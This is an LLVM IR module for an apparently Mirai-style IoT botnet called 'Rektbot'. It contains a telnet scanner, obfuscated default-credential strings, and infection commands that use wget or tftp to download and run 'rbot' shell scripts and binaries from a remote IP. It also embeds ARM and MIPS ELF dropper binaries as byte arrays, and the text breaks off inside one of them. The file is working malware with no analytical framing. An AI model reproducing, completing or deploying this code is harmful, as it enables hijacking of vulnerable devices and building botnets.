; ModuleID = 'host/ir_O1/Rektbot.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.payload = type { i8, i8, i8*, i16 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.scanner_connection = type { %struct.scanner_auth*, %struct.telnet_info, i32, i32, i32, i32, i32, [8192 x i8], [16 x i8], i8, i8, i8, i8, i16, i16, i32, i32 }
%struct.telnet_info = type { i32, i32 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.binary = type { i8*, i8 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fd_ctrl = local_unnamed_addr global i32 -1, align 4
@fd_serv = local_unnamed_addr global i32 -1, align 4
@pending_connection = local_unnamed_addr global i8 0, align 1
@pid1 = common local_unnamed_addr global i32 0, align 4
@pid2 = common local_unnamed_addr global i32 0, align 4
@maintain_thread = common local_unnamed_addr global i32 0, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@scanner_pid = common local_unnamed_addr global i32 0, align 4
@spid = common local_unnamed_addr global i32 0, align 4
@mainpid = common local_unnamed_addr global i32 0, align 4
@srv_addr = common global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"/bin/busybox\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@ensure_single_instance.local_bind = internal unnamed_addr global i1 false, align 1
@fake_time = local_unnamed_addr global i32 0, align 4
@rsck = common local_unnamed_addr global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [5 x i8] c"PMMV\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"VVLGV\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"\13\12\12\13AJKL\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"KTFGT\00", align 1
@.str.24 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"@KL\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"FGDCWNV\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"FCGOML\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"AOQ\17\12\12\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"pmmv\17\12\12\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"pmmv\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"VQNKLWZ\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"XQWL\13\13\1A\1A\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"rNQaJEoG\13\00", align 1
@.str.34 = private unnamed_addr constant [8 x i8] c"WREPCFG\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"VGNAM\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\13\13\13\13\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\16\11\10\13\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"WKF\1F\12\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"WKF\12\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"Q[QVGO\00", align 1
@.str.41 = private unnamed_addr constant [11 x i8] c"VGNLGVPMMV\00", align 1
@.str.42 = private unnamed_addr constant [13 x i8] c"PMMVRCQQUMPF\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"PMMVRCQQ\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"VGNLGVRCQQ\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"VGNLGVRCQQUMPF\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"RCQQUMPF\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"RCQQ\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"QJGNN\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"VCxXb\10\11\16\1B\17\1A\17\1B\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"VQEMKLEML\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"QWRGPWQGP\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"NKLWZQJGNN\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"V\12VCNA\12LVP\12N\16\03\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"EWGQV\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"\13\10\11\16\17\14\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"\13\10\11\16\17\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"WQGP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CFOKL\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"FGTKAG\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"\13\10\11\16\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"\13\13\13\13\13\13\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"\13\1B\1A\1A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"\10\10\10\10\10\00", align 1
@.str.65 = private unnamed_addr constant [14 x i8] c"cFOKLKQVPCVMP\00", align 1
@.str.66 = private unnamed_addr constant [14 x i8] c"CFOKLKQVPCVMP\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"cFOKL\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"CFO\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"\15WHoIM\12CFOKL\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"QOACFOKL\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"CFOKL\13\10\11\16\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"CFOKL\13\10\11\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"C@A\13\10\11\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"ACV\13\12\10\1B\22\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"\17WR\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"\03PMMV\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.78 = private unnamed_addr constant [3 x i8] c"\13\10\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"CLVQNS\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"\13\10\11\16\17\14\15\1A\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"\12\12\12\12\12\12\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"\12\12\12\12\12\12\12\12\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"\13\10\11\16SUGP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"CLLK\10\12\13\11\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"\17\16\11\10\13\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"XNZZ\0C\22\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"HT@XF\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"CLIM\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"ZOJFKRA\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"ZA\11\17\13\13\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"TKXZT\00", align 1
@.str.92 = private unnamed_addr constant [8 x i8] c"CLVQNS\22\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"HWCLVGAJ\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"eo\1A\13\1A\10\22\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"\1A\1A\1A\1A\1A\1A\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"\14\14\14\14\14\14\00", align 1
@.str.97 = private unnamed_addr constant [9 x i8] c"JWLV\17\15\17\1B\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"QWRGPTKQMP\00", align 1
@.str.99 = private unnamed_addr constant [9 x i8] c"X[CF\13\10\11\16\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"OE\11\17\12\12\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"OGPNKL\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"QWRRMPV\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"VGNLGV\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"MRGPCVMP\00", align 1
@.str.105 = private unnamed_addr constant [37 x i8] c"enable\0D\0Asystem\0D\0Ashell\0D\0Ash\0D\0Aping ; sh\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.107 = private unnamed_addr constant [141 x i8] c"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.110 = private unnamed_addr constant [142 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s\00", align 1
@tmp_dirs = local_unnamed_addr global [15 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.111 = private unnamed_addr constant [18 x i8] c">%s.file && cd %s\00", align 1
@.str.112 = private unnamed_addr constant [32 x i8] c"/bin/busybox rm -rf .file %s %s\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c".rbot.binary\00", align 1
@.str.114 = private unnamed_addr constant [14 x i8] c".rbot.dropper\00", align 1
@.str.115 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox .rbot.binary; >.rbot.binary; /bin/busybox chmod 777 .rbot.binary; %s\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.117 = private unnamed_addr constant [142 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >.rbot.shell; /bin/busybox tftp -g -l .rbot.shell -r rbot.sh %d.%d.%d.%d; sh .rbot.shell; %s\00", align 1
@.str.118 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget; /bin/busybox tftp; %s\00", align 1
@.str.119 = private unnamed_addr constant [101 x i8] c"/bin/busybox cp /bin/busybox .rbot.dropper; >.rbot.dropper; /bin/busybox chmod 777 .rbot.dropper; %s\00", align 1
@.str.120 = private unnamed_addr constant [125 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >.rbot.binary; /bin/busybox chmod 777 .rbot.binary;./.rbot.binarys wget; %s\00", align 1
@.str.121 = private unnamed_addr constant [121 x i8] c"/bin/busybox tftp -g -l .rbot.binary -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 .rbot.binary;./.rbot.binary tftp; %s\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.125 = private unnamed_addr constant [36 x i8] c"./.rbot.dropper;./.rbot.binary echo\00", align 1
@.str.126 = private unnamed_addr constant [24 x i8] c"chmod 777 .rbot.dropper\00", align 1
@.str.122 = private unnamed_addr constant [50 x i8] c"/bin/busybox echo -en '%s' %s .rbot.dropper;%s;%s\00", align 1
@.str.150 = private unnamed_addr constant [21 x i8] c"ead-only file system\00", align 1
@.str.151 = private unnamed_addr constant [17 x i8] c"ermission denied\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"\5Cx%02x\00", align 1
@payloads = global [4 x %struct.payload] [%struct.payload { i8 1, i8 40, i8* getelementptr inbounds ([1081 x i8], [1081 x i8]* @.str.16, i32 0, i32 0), i16 1080 }, %struct.payload { i8 1, i8 41, i8* getelementptr inbounds ([1337 x i8], [1337 x i8]* @.str.17, i32 0, i32 0), i16 1336 }, %struct.payload { i8 2, i8 8, i8* getelementptr inbounds ([1889 x i8], [1889 x i8]* @.str.18, i32 0, i32 0), i16 1888 }, %struct.payload { i8 1, i8 8, i8* getelementptr inbounds ([1921 x i8], [1921 x i8]* @.str.19, i32 0, i32 0), i16 1920 }], align 16
@.str.16 = private unnamed_addr constant [1081 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\DC\82\00\004\00\00\00p\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\03\00\00P\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\03\00\00P\03\01\00P\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\87\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\83\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1|\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5t\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1k\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1d\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5\5C\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9@\E1\9F\E5\94\D0M\E2\00\00\00\EA\01\E0\8E\E2\00`\DE\E5\00\00V\E3\FB\FF\FF\1A$\C1\9F\E5\D00\A0\E3\0E\80l\E0\02@\A0\E3P\C0\A0\E3k\10\A0\E3\85 \A0\E3\B0\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A9\FF\FF\EB\F4\10\9F\E5\84\00\8D\E5\F0 \9F\E5\F0\00\9F\E5\BC\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\AA\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B5\FF\FF\EB\00\00P\E3\00\00`\B2\A3\FF\FF\BB\17@\88\E2\05\00\A0\E1\A0\10\9F\E5\04 \A0\E1\B7\FF\FF\EB\04\00P\E1\03\00\A0\13\9B\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\B6\FF\FF\EB\01\00P\E3\04\00\A0\E3\93\FF\FF\1B\930\DD\E5\04D\83\E1d0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\AA\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\9D\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1\85\FF\FF\EB\07\00\A0\E1\83\FF\FF\EB\05\00\A0\E3}\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\1C\83\00\00A\02\00\00\FF\01\00\00$\83\00\004\83\00\00\0A\0D\0A\0D\A5\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1P\03\01\00arm4\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm4 HTTP/1.0\0D\0A\0D\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\A8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\1C\83\00\00\1C\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00P\03\01\00P\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00P\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.17 = private unnamed_addr constant [1337 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00l\83\00\004\00\00\00H\04\00\00\02\00\00\044\00 \00\04\00(\00\06\00\05\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\14\04\00\00\14\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\10\00\00\00\10\00\00\00\06\00\00\00\00\80\00\00\07\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\00\00\00\00\08\00\00\00\04\00\00\00\04\00\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\9D\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\95\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\8A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\7F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3s\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3h\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5]\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9@1\9F\E5\98\D0M\E2\00@\A0\E3\00\00\00\EA\01@\84\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1A\02\C0\A0\E3\D00\A0\E3k\10\A0\E3\85 \A0\E3\B4\C8\CD\E1\B0\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\9A\FF\FF\EB\FC\10\9F\E5\88\00\8D\E5\F8 \9F\E5\F8\00\9F\E5\AE\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\94\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\AB\FF\FF\EB\00\00P\E3\00\00`\B2\8D\FF\FF\BB\17@\84\E2\05\00\A0\E1\A8\10\9F\E5\04 \A0\E1\AF\FF\FF\EB\04\00P\E1\03\00\A0\13\85\FF\FF\1B\94\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\B0\FF\FF\EB\01\00P\E3\04\00\A0\E3{\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\A4\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1r\FF\FF\EB\07\00\A0\E1p\FF\FF\EB\05\00\A0\E3f\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\E1\83\00\00A\02\00\00\FF\01\00\00\E8\83\00\00\F8\83\00\00\0A\0D\0A\0D\A5\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\04\E0-\E5\1C \9F\E5\000\A0\E1\02 \9F\E7\06\00\00\EB\000c\E2\020\80\E7\00\00\E0\E3\04\E0\9D\E4\1E\FF/\E1l\80\00\00\00\00\00\00\0F\0A\E0\E3\1F\F0@\E2\00\00\A0\E1\00\00\A0\E1arm7\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm7 HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00.shstrtab\00.text\00.rodata\00.tbss\00.got\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\C0\80\00\00\C0\00\00\00 \03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\E0\83\00\00\E0\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\04\00\00\14\04\01\00\14\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\1F\00\00\00\01\00\00\00\03\00\00\00\14\04\01\00\14\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00$\04\00\00$\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [1889 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04`\00\00\004\00\00\06H\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\05\B4\00\00\05\B4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\05\C0\00D\05\C0\00D\05\C0\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\84\E8\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\84\CC\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\84\B0\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\88\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84<\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\14\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\83\EC\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\83\A0\03\99\E0!'\BD\FF@\AF\BF\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\80\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF$\02\00\02\A7\A2\00\1C$\02\00P\A7\A2\00\1E\8F\82\80\18\8F\99\80L$\07\00\D0$\04\00\B0$\05\00k$\06\00\85$B\05\80\03 \F8\09\02\02\80#\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\88$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\02 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&\10\00\17$\A5\05\98\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C0<\1C\00\05'\9C\81P\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\818\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81\10\03\99\E0!\00\80\10!\00\A0 